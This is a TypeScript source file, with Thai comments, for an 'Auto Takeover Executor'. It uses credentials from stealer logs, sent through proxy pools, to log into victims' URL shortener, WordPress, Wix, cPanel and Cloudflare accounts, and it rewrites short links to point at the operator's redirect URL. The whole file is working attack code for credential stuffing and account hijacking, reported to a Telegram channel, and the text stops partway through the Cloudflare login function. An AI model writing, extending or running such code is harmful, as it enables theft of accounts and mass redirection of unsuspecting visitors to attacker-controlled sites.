/**
 * Auto Takeover Executor
 * 
 * หลังจาก Redirect Takeover Intelligence วิเคราะห์เสร็จ
 * module นี้จะ execute top takeover vectors อัตโนมัติ:
 * 
 * 1. Short URL Account Takeover (t.ly, bit.ly, cutt.ly, tinyurl, rb.gy, s.id)
 *    - Login ผ่าน API endpoint / POST form
 *    - ค้นหา short link ใน dashboard
 *    - เปลี่ยน destination URL เป็นของเรา
 * 
 * 2. WordPress Admin Takeover
 *    - XMLRPC brute force
 *    - REST API editor
 *    - wp-admin login + redirect injection
 * 
 * 3. CMS/Hosting Panel Takeover
 *    - cPanel, Plesk, DirectAdmin login
 *    - Wix editor access
 *    - Shopify admin
 * 
 * 4. DNS Provider Takeover
 *    - Cloudflare, GoDaddy, Namecheap login
 *    - DNS record modification
 */

import { fetchWithPoolProxy, fetchWithThaiProxy } from "./proxy-pool";
import type { TakeoverVector, TakeoverIntelResult } from "./redirect-takeover-intel";
import { pickRedirectUrl } from "./agentic-attack-engine";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface TakeoverExecutionConfig {
  /** Intel result from Phase 7 */
  intelResult: TakeoverIntelResult;
  /** Max vectors to try (default: 3) */
  maxVectors?: number;
  /** Max credentials per vector (default: 15) */
  maxCredsPerVector?: number;
  /** Max total duration in ms (default: 120s) */
  maxDurationMs?: number;
  /** Our redirect URL (if not provided, will pick from pool) */
  ourRedirectUrl?: string;
  /** Progress callback for Telegram narrator */
  onProgress?: (phase: string, detail: string) => void;
  /** Per-attempt callback */
  onAttempt?: (vectorId: string, email: string, status: "trying" | "success" | "failed", detail: string) => void;
}

export interface TakeoverAttemptResult {
  vectorId: string;
  vectorName: string;
  email: string;
  password: string;
  success: boolean;
  detail: string;
  /** If login succeeded, what access did we get? */
  accessType?: string;
  /** If we changed the redirect, what's the new URL? */
  newRedirectUrl?: string;
  /** Session token/cookie if login succeeded */
  sessionToken?: string;
  durationMs: number;
}

export interface TakeoverExecutionResult {
  totalAttempts: number;
  successfulLogins: TakeoverAttemptResult[];
  redirectChanged: boolean;
  newRedirectUrl: string | null;
  vectorsAttempted: number;
  totalDurationMs: number;
  /** Summary for Telegram */
  summary: string;
  /** Detailed attempts log */
  attempts: TakeoverAttemptResult[];
}

// ═══════════════════════════════════════════════════════
//  SHORT URL SERVICE LOGIN HANDLERS
// ═══════════════════════════════════════════════════════

interface ShortUrlLoginHandler {
  service: string;
  /** Try to login and return session info */
  login: (email: string, password: string) => Promise<{ success: boolean; sessionToken?: string; detail: string }>;
  /** Find the target short link in the account */
  findLink: (sessionToken: string, shortCode: string) => Promise<{ found: boolean; linkId?: string; currentDest?: string; detail: string }>;
  /** Change the destination URL */
  changeDestination: (sessionToken: string, linkId: string, newUrl: string) => Promise<{ success: boolean; detail: string }>;
}

// ─── T.LY Handler ───
const tlyHandler: ShortUrlLoginHandler = {
  service: "t.ly",
  
  async login(email: string, password: string) {
    try {
      // t.ly uses standard form-based login
      const { response } = await fetchWithPoolProxy("https://t.ly/api/v1/link/shorten", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json",
        },
        // First try API key auth — some stealer logs contain API keys as passwords
        body: JSON.stringify({ long_url: "https://example.com/test-auth-check" }),
      }, { timeout: 15000 });
      
      // Try Bearer token auth (password might be an API key)
      const { response: apiResp } = await fetchWithPoolProxy("https://t.ly/api/v1/link/list", {
        headers: {
          "Authorization": `Bearer ${password}`,
          "Accept": "application/json",
        },
      }, { timeout: 15000 });
      
      if (apiResp.ok) {
        const data = await apiResp.json().catch(() => null);
        if (data && !data.error) {
          return { success: true, sessionToken: password, detail: `API key auth successful (${email})` };
        }
      }
      
      // Try form login via POST
      const { response: loginResp } = await fetchWithPoolProxy("https://t.ly/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "Accept": "text/html,application/json",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        },
        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`,
        redirect: "manual",
      }, { timeout: 15000 });
      
      // Check for success indicators
      const status = loginResp.status;
      const location = loginResp.headers.get("location") || "";
      const setCookie = loginResp.headers.get("set-cookie") || "";
      
      if (status === 302 && (location.includes("dashboard") || location.includes("/app"))) {
        const token = setCookie.match(/(?:token|session|auth)[=:]([^;]+)/i)?.[1] || setCookie;
        return { success: true, sessionToken: token, detail: `Form login successful → ${location}` };
      }
      
      if (status === 200) {
        const body = await loginResp.text().catch(() => "");
        if (body.includes("dashboard") || body.includes("my-links") || body.includes("api_token")) {
          const token = setCookie.match(/(?:token|session|auth)[=:]([^;]+)/i)?.[1] || "session";
          return { success: true, sessionToken: token, detail: "Login successful (200 with dashboard content)" };
        }
      }
      
      return { success: false, detail: `Login failed (status: ${status})` };
    } catch (err: any) {
      return { success: false, detail: `Login error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async findLink(sessionToken: string, shortCode: string) {
    try {
      // Try API to list links
      const { response } = await fetchWithPoolProxy("https://t.ly/api/v1/link/list", {
        headers: {
          "Authorization": `Bearer ${sessionToken}`,
          "Accept": "application/json",
        },
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => null);
        if (data?.data) {
          const links = Array.isArray(data.data) ? data.data : [];
          const target = links.find((l: any) => 
            l.short_url?.includes(shortCode) || l.slug === shortCode
          );
          if (target) {
            return { found: true, linkId: target.id || target.slug, currentDest: target.long_url, detail: `Found: ${target.short_url} → ${target.long_url}` };
          }
          return { found: false, detail: `Link ${shortCode} not found in ${links.length} links` };
        }
      }
      return { found: false, detail: "Could not list links" };
    } catch (err: any) {
      return { found: false, detail: `Find error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async changeDestination(sessionToken: string, linkId: string, newUrl: string) {
    try {
      const { response } = await fetchWithPoolProxy(`https://t.ly/api/v1/link/update`, {
        method: "PUT",
        headers: {
          "Authorization": `Bearer ${sessionToken}`,
          "Content-Type": "application/json",
          "Accept": "application/json",
        },
        body: JSON.stringify({ id: linkId, long_url: newUrl }),
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => null);
        if (data && !data.error) {
          return { success: true, detail: `Destination changed to ${newUrl}` };
        }
        return { success: false, detail: `API returned error: ${JSON.stringify(data).substring(0, 80)}` };
      }
      return { success: false, detail: `Update failed (status: ${response.status})` };
    } catch (err: any) {
      return { success: false, detail: `Update error: ${err.message?.substring(0, 60)}` };
    }
  },
};

// ─── Bitly Handler ───
const bitlyHandler: ShortUrlLoginHandler = {
  service: "bit.ly",
  
  async login(email: string, password: string) {
    try {
      // Bitly API uses OAuth tokens — password might be an access token
      const { response } = await fetchWithPoolProxy("https://api-ssl.bitly.com/v4/user", {
        headers: {
          "Authorization": `Bearer ${password}`,
          "Accept": "application/json",
        },
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => null);
        if (data?.login) {
          return { success: true, sessionToken: password, detail: `API token auth: ${data.login}` };
        }
      }
      
      // Try form login
      const { response: loginResp } = await fetchWithPoolProxy("https://bitly.com/a/sign_in", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
        body: `login=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`,
        redirect: "manual",
      }, { timeout: 15000 });
      
      const status = loginResp.status;
      const location = loginResp.headers.get("location") || "";
      
      if ((status === 302 || status === 301) && !location.includes("sign_in")) {
        const setCookie = loginResp.headers.get("set-cookie") || "";
        return { success: true, sessionToken: setCookie, detail: `Form login → ${location}` };
      }
      
      return { success: false, detail: `Login failed (status: ${status})` };
    } catch (err: any) {
      return { success: false, detail: `Login error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async findLink(sessionToken: string, shortCode: string) {
    try {
      const { response } = await fetchWithPoolProxy(`https://api-ssl.bitly.com/v4/bitlinks/bit.ly/${shortCode}`, {
        headers: {
          "Authorization": `Bearer ${sessionToken}`,
          "Accept": "application/json",
        },
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => null);
        if (data?.long_url) {
          return { found: true, linkId: data.id || `bit.ly/${shortCode}`, currentDest: data.long_url, detail: `Found: bit.ly/${shortCode} → ${data.long_url}` };
        }
      }
      return { found: false, detail: `Link bit.ly/${shortCode} not found or not owned by this account` };
    } catch (err: any) {
      return { found: false, detail: `Find error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async changeDestination(sessionToken: string, linkId: string, newUrl: string) {
    try {
      const { response } = await fetchWithPoolProxy(`https://api-ssl.bitly.com/v4/bitlinks/${linkId}`, {
        method: "PATCH",
        headers: {
          "Authorization": `Bearer ${sessionToken}`,
          "Content-Type": "application/json",
          "Accept": "application/json",
        },
        body: JSON.stringify({ long_url: newUrl }),
      }, { timeout: 15000 });
      
      if (response.ok) {
        return { success: true, detail: `Destination changed to ${newUrl}` };
      }
      const body = await response.text().catch(() => "");
      return { success: false, detail: `Update failed (${response.status}): ${body.substring(0, 80)}` };
    } catch (err: any) {
      return { success: false, detail: `Update error: ${err.message?.substring(0, 60)}` };
    }
  },
};

// ─── Cutt.ly Handler ───
const cuttlyHandler: ShortUrlLoginHandler = {
  service: "cutt.ly",
  
  async login(email: string, password: string) {
    try {
      // Cutt.ly API key auth
      const { response } = await fetchWithPoolProxy(`https://cutt.ly/api/api.php?key=${encodeURIComponent(password)}&stats=1`, {
        headers: { "Accept": "application/json" },
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => null);
        if (data && !data.error) {
          return { success: true, sessionToken: password, detail: `API key auth successful` };
        }
      }
      
      // Try form login
      const { response: loginResp } = await fetchWithPoolProxy("https://cutt.ly/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`,
        redirect: "manual",
      }, { timeout: 15000 });
      
      const status = loginResp.status;
      const location = loginResp.headers.get("location") || "";
      if ((status === 302 || status === 301) && (location.includes("dashboard") || location.includes("/app"))) {
        const setCookie = loginResp.headers.get("set-cookie") || "";
        return { success: true, sessionToken: setCookie, detail: `Form login → ${location}` };
      }
      
      return { success: false, detail: `Login failed (status: ${status})` };
    } catch (err: any) {
      return { success: false, detail: `Login error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async findLink(sessionToken: string, shortCode: string) {
    try {
      // Cutt.ly doesn't have a direct link lookup API, try stats
      const { response } = await fetchWithPoolProxy(`https://cutt.ly/api/api.php?key=${encodeURIComponent(sessionToken)}&stats=${encodeURIComponent(`https://cutt.ly/${shortCode}`)}`, {
        headers: { "Accept": "application/json" },
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => null);
        if (data?.stats?.url) {
          return { found: true, linkId: shortCode, currentDest: data.stats.url, detail: `Found: cutt.ly/${shortCode} → ${data.stats.url}` };
        }
      }
      return { found: false, detail: `Link cutt.ly/${shortCode} not found` };
    } catch (err: any) {
      return { found: false, detail: `Find error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async changeDestination(_sessionToken: string, _linkId: string, _newUrl: string) {
    return { success: false, detail: "Cutt.ly API does not support link editing" };
  },
};

// ─── TinyURL Handler ───
const tinyurlHandler: ShortUrlLoginHandler = {
  service: "tinyurl.com",
  
  async login(email: string, password: string) {
    try {
      // TinyURL API token auth
      const { response } = await fetchWithPoolProxy("https://api.tinyurl.com/alias/tinyurl.com/test", {
        headers: {
          "Authorization": `Bearer ${password}`,
          "Accept": "application/json",
        },
      }, { timeout: 15000 });
      
      if (response.status !== 401 && response.status !== 403) {
        return { success: true, sessionToken: password, detail: `API token auth successful` };
      }
      
      // Try form login
      const { response: loginResp } = await fetchWithPoolProxy("https://tinyurl.com/app/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`,
        redirect: "manual",
      }, { timeout: 15000 });
      
      const status = loginResp.status;
      const location = loginResp.headers.get("location") || "";
      if ((status === 302 || status === 301) && !location.includes("login")) {
        const setCookie = loginResp.headers.get("set-cookie") || "";
        return { success: true, sessionToken: setCookie, detail: `Form login → ${location}` };
      }
      
      return { success: false, detail: `Login failed (status: ${status})` };
    } catch (err: any) {
      return { success: false, detail: `Login error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async findLink(sessionToken: string, shortCode: string) {
    try {
      const { response } = await fetchWithPoolProxy(`https://api.tinyurl.com/alias/tinyurl.com/${shortCode}`, {
        headers: {
          "Authorization": `Bearer ${sessionToken}`,
          "Accept": "application/json",
        },
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => null);
        if (data?.data?.url) {
          return { found: true, linkId: shortCode, currentDest: data.data.url, detail: `Found: tinyurl.com/${shortCode} → ${data.data.url}` };
        }
      }
      return { found: false, detail: `Link tinyurl.com/${shortCode} not found` };
    } catch (err: any) {
      return { found: false, detail: `Find error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async changeDestination(sessionToken: string, linkId: string, newUrl: string) {
    try {
      const { response } = await fetchWithPoolProxy(`https://api.tinyurl.com/change`, {
        method: "PATCH",
        headers: {
          "Authorization": `Bearer ${sessionToken}`,
          "Content-Type": "application/json",
          "Accept": "application/json",
        },
        body: JSON.stringify({ domain: "tinyurl.com", alias: linkId, url: newUrl }),
      }, { timeout: 15000 });
      
      if (response.ok) {
        return { success: true, detail: `Destination changed to ${newUrl}` };
      }
      return { success: false, detail: `Update failed (${response.status})` };
    } catch (err: any) {
      return { success: false, detail: `Update error: ${err.message?.substring(0, 60)}` };
    }
  },
};

// ─── Rebrandly Handler ───
const rebrandlyHandler: ShortUrlLoginHandler = {
  service: "rb.gy",
  
  async login(email: string, password: string) {
    try {
      const { response } = await fetchWithPoolProxy("https://api.rebrandly.com/v1/account", {
        headers: {
          "apikey": password,
          "Accept": "application/json",
        },
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => null);
        if (data?.id) {
          return { success: true, sessionToken: password, detail: `API key auth: ${data.fullName || data.email || data.id}` };
        }
      }
      return { success: false, detail: `Login failed` };
    } catch (err: any) {
      return { success: false, detail: `Login error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async findLink(sessionToken: string, shortCode: string) {
    try {
      const { response } = await fetchWithPoolProxy(`https://api.rebrandly.com/v1/links?slashtag=${shortCode}`, {
        headers: {
          "apikey": sessionToken,
          "Accept": "application/json",
        },
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => []);
        const link = Array.isArray(data) ? data[0] : null;
        if (link) {
          return { found: true, linkId: link.id, currentDest: link.destination, detail: `Found: ${link.shortUrl} → ${link.destination}` };
        }
      }
      return { found: false, detail: `Link not found` };
    } catch (err: any) {
      return { found: false, detail: `Find error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async changeDestination(sessionToken: string, linkId: string, newUrl: string) {
    try {
      const { response } = await fetchWithPoolProxy(`https://api.rebrandly.com/v1/links/${linkId}`, {
        method: "POST",
        headers: {
          "apikey": sessionToken,
          "Content-Type": "application/json",
          "Accept": "application/json",
        },
        body: JSON.stringify({ destination: newUrl }),
      }, { timeout: 15000 });
      
      if (response.ok) {
        return { success: true, detail: `Destination changed to ${newUrl}` };
      }
      return { success: false, detail: `Update failed (${response.status})` };
    } catch (err: any) {
      return { success: false, detail: `Update error: ${err.message?.substring(0, 60)}` };
    }
  },
};

// ─── S.id Handler ───
const sidHandler: ShortUrlLoginHandler = {
  service: "s.id",
  
  async login(email: string, password: string) {
    try {
      const { response } = await fetchWithPoolProxy("https://api.s.id/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json",
        },
        body: JSON.stringify({ email, password }),
      }, { timeout: 15000 });
      
      if (response.ok) {
        const data = await response.json().catch(() => null);
        if (data?.token || data?.access_token) {
          return { success: true, sessionToken: data.token || data.access_token, detail: `Login successful` };
        }
      }
      return { success: false, detail: `Login failed (${response.status})` };
    } catch (err: any) {
      return { success: false, detail: `Login error: ${err.message?.substring(0, 60)}` };
    }
  },
  
  async findLink(_sessionToken: string, _shortCode: string) {
    return { found: false, detail: "S.id link lookup not implemented" };
  },
  
  async changeDestination(_sessionToken: string, _linkId: string, _newUrl: string) {
    return { success: false, detail: "S.id link editing not implemented" };
  },
};

// ═══════════════════════════════════════════════════════
//  SERVICE HANDLER REGISTRY
// ═══════════════════════════════════════════════════════

const SHORT_URL_HANDLERS: Record<string, ShortUrlLoginHandler> = {
  "t.ly": tlyHandler,
  "bit.ly": bitlyHandler,
  "cutt.ly": cuttlyHandler,
  "tinyurl.com": tinyurlHandler,
  "rb.gy": rebrandlyHandler,
  "s.id": sidHandler,
};

// ═══════════════════════════════════════════════════════
//  WORDPRESS TAKEOVER
// ═══════════════════════════════════════════════════════

async function tryWordPressLogin(
  domain: string,
  credentials: Array<{ email: string; password: string }>,
  onAttempt?: TakeoverExecutionConfig["onAttempt"],
): Promise<TakeoverAttemptResult[]> {
  const results: TakeoverAttemptResult[] = [];
  
  for (const cred of credentials) {
    const start = Date.now();
    onAttempt?.("platform_takeover_wordpress", cred.email, "trying", `WP XMLRPC: ${cred.email}`);
    
    try {
      // Method 1: XMLRPC
      const xmlBody = `<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>${escapeXml(cred.email)}</string></value></param><param><value><string>${escapeXml(cred.password)}</string></value></param></params></methodCall>`;
      
      const { response } = await fetchWithPoolProxy(`http://${domain}/xmlrpc.php`, {
        method: "POST",
        headers: { "Content-Type": "text/xml" },
        body: xmlBody,
      }, { timeout: 15000 });
      
      const body = await response.text();
      
      if (body.includes("isAdmin") || body.includes("blogid") || body.includes("blogName")) {
        const result: TakeoverAttemptResult = {
          vectorId: "platform_takeover_wordpress",
          vectorName: "WordPress XMLRPC Login",
          email: cred.email,
          password: cred.password,
          success: true,
          detail: `XMLRPC login successful: ${cred.email}`,
          accessType: "wp_admin",
          durationMs: Date.now() - start,
        };
        onAttempt?.("platform_takeover_wordpress", cred.email, "success", `✅ WP login: ${cred.email}`);
        results.push(result);
        return results; // Stop on first success
      }
      
      results.push({
        vectorId: "platform_takeover_wordpress",
        vectorName: "WordPress XMLRPC Login",
        email: cred.email,
        password: cred.password,
        success: false,
        detail: "Invalid credentials",
        durationMs: Date.now() - start,
      });
      onAttempt?.("platform_takeover_wordpress", cred.email, "failed", `❌ WP: ${cred.email}`);
    } catch (err: any) {
      results.push({
        vectorId: "platform_takeover_wordpress",
        vectorName: "WordPress XMLRPC Login",
        email: cred.email,
        password: cred.password,
        success: false,
        detail: `Error: ${err.message?.substring(0, 60)}`,
        durationMs: Date.now() - start,
      });
      onAttempt?.("platform_takeover_wordpress", cred.email, "failed", `❌ WP error: ${err.message?.substring(0, 40)}`);
    }
  }
  
  return results;
}

// ═══════════════════════════════════════════════════════
//  WIX TAKEOVER
// ═══════════════════════════════════════════════════════

async function tryWixLogin(
  domain: string,
  credentials: Array<{ email: string; password: string }>,
  onAttempt?: TakeoverExecutionConfig["onAttempt"],
): Promise<TakeoverAttemptResult[]> {
  const results: TakeoverAttemptResult[] = [];
  
  for (const cred of credentials) {
    const start = Date.now();
    onAttempt?.("platform_takeover_wix", cred.email, "trying", `Wix: ${cred.email}`);
    
    try {
      // Wix uses OAuth-based login — try the standard login endpoint
      const { response } = await fetchWithPoolProxy("https://users.wix.com/signin", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
        body: JSON.stringify({
          email: cred.email,
          password: cred.password,
          rememberMe: true,
        }),
      }, { timeout: 15000 });
      
      const status = response.status;
      const body = await response.text().catch(() => "");
      
      if (status === 200 && (body.includes("token") || body.includes("session") || body.includes("success"))) {
        try {
          const data = JSON.parse(body);
          if (data.token || data.sessionToken || data.success) {
            const result: TakeoverAttemptResult = {
              vectorId: "platform_takeover_wix",
              vectorName: "Wix Account Login",
              email: cred.email,
              password: cred.password,
              success: true,
              detail: `Wix login successful: ${cred.email}`,
              accessType: "wix_editor",
              sessionToken: data.token || data.sessionToken,
              durationMs: Date.now() - start,
            };
            onAttempt?.("platform_takeover_wix", cred.email, "success", `✅ Wix login: ${cred.email}`);
            results.push(result);
            return results;
          }
        } catch {}
      }
      
      results.push({
        vectorId: "platform_takeover_wix",
        vectorName: "Wix Account Login",
        email: cred.email,
        password: cred.password,
        success: false,
        detail: `Login failed (status: ${status})`,
        durationMs: Date.now() - start,
      });
      onAttempt?.("platform_takeover_wix", cred.email, "failed", `❌ Wix: ${cred.email}`);
    } catch (err: any) {
      results.push({
        vectorId: "platform_takeover_wix",
        vectorName: "Wix Account Login",
        email: cred.email,
        password: cred.password,
        success: false,
        detail: `Error: ${err.message?.substring(0, 60)}`,
        durationMs: Date.now() - start,
      });
      onAttempt?.("platform_takeover_wix", cred.email, "failed", `❌ Wix error: ${err.message?.substring(0, 40)}`);
    }
  }
  
  return results;
}

// ═══════════════════════════════════════════════════════
//  CPANEL / HOSTING PANEL TAKEOVER
// ═══════════════════════════════════════════════════════

const CPANEL_PORTS = [2082, 2083, 2086, 2087];

async function tryCpanelLogin(
  domain: string,
  credentials: Array<{ email: string; password: string }>,
  onAttempt?: TakeoverExecutionConfig["onAttempt"],
): Promise<TakeoverAttemptResult[]> {
  const results: TakeoverAttemptResult[] = [];
  const host = domain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
  
  // First find which port has cPanel
  let cpanelUrl: string | null = null;
  for (const port of CPANEL_PORTS) {
    const proto = [2083, 2087].includes(port) ? "https" : "http";
    try {
      const resp = await fetch(`${proto}://${host}:${port}/`, {
        signal: AbortSignal.timeout(5000),
        redirect: "follow",
      }).catch(() => null);
      if (resp && resp.status !== 0) {
        const body = await resp.text().catch(() => "");
        if (body.includes("cPanel") || body.includes("cpanel") || body.includes("whm")) {
          cpanelUrl = `${proto}://${host}:${port}`;
          break;
        }
      }
    } catch {}
  }
  
  if (!cpanelUrl) {
    return [{ vectorId: "cpanel_takeover", vectorName: "cPanel Login", email: "", password: "", success: false, detail: "No cPanel found", durationMs: 0 }];
  }
  
  for (const cred of credentials) {
    const start = Date.now();
    // Use email prefix as username for cPanel
    const username = cred.email.includes("@") ? cred.email.split("@")[0] : cred.email;
    onAttempt?.("cpanel_takeover", username, "trying", `cPanel: ${username}@${cpanelUrl}`);
    
    try {
      const loginResp = await fetch(`${cpanelUrl}/login/?login_only=1`, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `user=${encodeURIComponent(username)}&pass=${encodeURIComponent(cred.password)}`,
        redirect: "manual",
        signal: AbortSignal.timeout(10000),
      }).catch(() => null);
      
      if (!loginResp) {
        results.push({ vectorId: "cpanel_takeover", vectorName: "cPanel Login", email: username, password: cred.password, success: false, detail: "Connection failed", durationMs: Date.now() - start });
        onAttempt?.("cpanel_takeover", username, "failed", `❌ cPanel: connection failed`);
        continue;
      }
      
      const location = loginResp.headers.get("location") || "";
      if (loginResp.status === 301 || loginResp.status === 302) {
        if (location.includes("cpsess") || location.includes("security_token")) {
          const result: TakeoverAttemptResult = {
            vectorId: "cpanel_takeover",
            vectorName: "cPanel Login",
            email: username,
            password: cred.password,
            success: true,
            detail: `cPanel login successful: ${username}@${cpanelUrl}`,
            accessType: "cpanel",
            sessionToken: location,
            durationMs: Date.now() - start,
          };
          onAttempt?.("cpanel_takeover", username, "success", `✅ cPanel: ${username}`);
          results.push(result);
          return results;
        }
      }
      
      results.push({ vectorId: "cpanel_takeover", vectorName: "cPanel Login", email: username, password: cred.password, success: false, detail: `Login failed (${loginResp.status})`, durationMs: Date.now() - start });
      onAttempt?.("cpanel_takeover", username, "failed", `❌ cPanel: ${username}`);
    } catch (err: any) {
      results.push({ vectorId: "cpanel_takeover", vectorName: "cPanel Login", email: username, password: cred.password, success: false, detail: `Error: ${err.message?.substring(0, 60)}`, durationMs: Date.now() - start });
      onAttempt?.("cpanel_takeover", username, "failed", `❌ cPanel error`);
    }
  }
  
  return results;
}

// ═══════════════════════════════════════════════════════
//  SHORT URL TAKEOVER EXECUTOR
// ═══════════════════════════════════════════════════════

async function executeShortUrlTakeover(
  vector: TakeoverVector,
  ourRedirectUrl: string,
  maxCreds: number,
  onAttempt?: TakeoverExecutionConfig["onAttempt"],
): Promise<TakeoverAttemptResult[]> {
  const results: TakeoverAttemptResult[] = [];
  
  // Determine which service
  const serviceMatch = Object.keys(SHORT_URL_HANDLERS).find(s => 
    vector.target.includes(s) || vector.id.includes(s.replace(".", "_"))
  );
  
  if (!serviceMatch) {
    return [{ vectorId: vector.id, vectorName: vector.name, email: "", password: "", success: false, detail: `No handler for service in vector: ${vector.target}`, durationMs: 0 }];
  }
  
  const handler = SHORT_URL_HANDLERS[serviceMatch];
  const shortCode = extractShortCode(vector.target, serviceMatch);
  const credsToTry = vector.credentialsToTry.slice(0, maxCreds);
  
  for (const cred of credsToTry) {
    const start = Date.now();
    onAttempt?.(vector.id, cred.email, "trying", `${handler.service}: ${cred.email}`);
    
    // Step 1: Login
    const loginResult = await handler.login(cred.email, cred.password);
    
    if (!loginResult.success) {
      results.push({
        vectorId: vector.id,
        vectorName: vector.name,
        email: cred.email,
        password: cred.password,
        success: false,
        detail: loginResult.detail,
        durationMs: Date.now() - start,
      });
      onAttempt?.(vector.id, cred.email, "failed", `❌ ${handler.service}: ${loginResult.detail.substring(0, 50)}`);
      continue;
    }
    
    onAttempt?.(vector.id, cred.email, "success", `🔓 ${handler.service} login OK: ${cred.email}`);
    
    // Step 2: Find the link
    if (shortCode && loginResult.sessionToken) {
      const findResult = await handler.findLink(loginResult.sessionToken, shortCode);
      
      if (findResult.found && findResult.linkId) {
        onAttempt?.(vector.id, cred.email, "success", `📎 Found link: ${findResult.detail}`);
        
        // Step 3: Change destination
        const changeResult = await handler.changeDestination(loginResult.sessionToken, findResult.linkId, ourRedirectUrl);
        
        if (changeResult.success) {
          results.push({
            vectorId: vector.id,
            vectorName: vector.name,
            email: cred.email,
            password: cred.password,
            success: true,
            detail: `🎯 TAKEOVER SUCCESS: ${handler.service} link changed to ${ourRedirectUrl}`,
            accessType: `${handler.service}_account`,
            newRedirectUrl: ourRedirectUrl,
            sessionToken: loginResult.sessionToken,
            durationMs: Date.now() - start,
          });
          onAttempt?.(vector.id, cred.email, "success", `🎯 REDIRECT CHANGED: ${ourRedirectUrl}`);
          return results; // Mission accomplished!
        } else {
          onAttempt?.(vector.id, cred.email, "failed", `⚠️ Link found but change failed: ${changeResult.detail.substring(0, 50)}`);
        }
      } else {
        onAttempt?.(vector.id, cred.email, "failed", `⚠️ Login OK but link not found: ${findResult.detail.substring(0, 50)}`);
      }
    }
    
    // Login succeeded but couldn't change link — still record as partial success
    results.push({
      vectorId: vector.id,
      vectorName: vector.name,
      email: cred.email,
      password: cred.password,
      success: true,
      detail: `Login OK but link change failed. Session: ${loginResult.sessionToken?.substring(0, 30)}...`,
      accessType: `${handler.service}_account`,
      sessionToken: loginResult.sessionToken,
      durationMs: Date.now() - start,
    });
  }
  
  return results;
}

// ═══════════════════════════════════════════════════════
//  CLOUDFLARE ACCOUNT TAKEOVER
// ═══════════════════════════════════════════════════════

interface CfSession {
  email: string;
  apiKey: string; // Global API Key
  authToken?: string; // Bearer token from login
}

interface CfPageRule {
  id: string;
  status: string;
  targets: Array<{ target: string; constraint: { operator: string; value: string } }>;
  actions: Array<{ id: string; value?: any }>;
}

interface CfRedirectRule {
  id: string;
  description?: string;
  expression: string;
  action: string;
  action_parameters?: any;
}

/**
 * Try to login to Cloudflare using email + password via the dashboard API.
 * Cloudflare doesn't have a simple password→API-key endpoint,
 * so we try multiple approaches:
 * 1. Use password as Global API Key directly (stealer logs often capture this)
 * 2. Use password as API Token (Bearer auth)
 * 3. Try dashboard login via POST to get session
 */
async function tryCfLogin(
  email: string,
  password: string,
): Promise<{ success: boolean; session?: CfSession; detail: string }> {
  // Method 1: Try password as Global API Key (X-Auth-Key)
  try {
    const resp = await fetch("https://api.cloudflare.com/client/v4/user", {
      headers: {
        "X-Auth-Email": email,
        "X-Auth-Key": password,
        "Content-Type": "application/json",
      },
      signal: AbortSignal.timeout(15000),
    });
    const data = await resp.json().catch(() => null) as any;
    if (data?.success && data?.result?.id) {
      return {
        success: true,
        session: { email, apiKey: password },
        detail: `CF Global API Key auth OK: ${data.result.email || email} (${data.result.id})`,
      };
    }
  } catch {}

  // Method 2: Try password as API Token (Bearer)
  try {
    const resp = await fetch("https://api.cloudflare.com/client/v4/user/tokens/verify", {
      headers: {
        "Authorization": `Bearer ${password}`,
        "Content-Type": "application/json",
      },
      signal: AbortSignal.timeout(15000),
    });
    const data = await resp.json().catch(() => null) as any;
    if (data?.success && data?.result?.status === "active") {
      return {
        success: true,
        session: { email, apiKey: "", authToken: password },
        detail: `CF API Token auth OK: token active (${data.result.id})`,
      };
    }
  } catch {}

  // Method 3: Try common password variations as API key
  // Some stealer logs have the key with extra whitespace or prefix
  const cleanedPassword = password.trim();
  if (cleanedPassword !== password) {
    try {
      const resp = await fetch("https://api.cloudflare.com/client/v4/user", {
        headers: {
          "X-Auth-Email": email,
